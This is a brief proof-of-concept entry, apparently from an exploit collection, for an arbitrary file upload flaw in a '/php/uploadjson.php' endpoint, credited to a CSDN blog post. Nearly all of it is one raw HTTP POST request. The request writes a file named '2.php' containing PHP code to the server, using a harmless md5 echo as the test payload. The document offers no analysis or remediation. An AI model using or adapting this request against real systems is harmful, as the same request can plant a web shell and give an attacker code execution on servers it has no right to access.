# spon_uploadjson_fileupload
2024/1/15
from :https://blog.csdn.net/luochen2436/article/details/135504061?spm=1001.2014.3001.5502
@2
```
POST /php/uploadjson.php HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip
 
jsondata[filename]=2.php&jsondata[data]=<?php echo md5('123456');?>

```
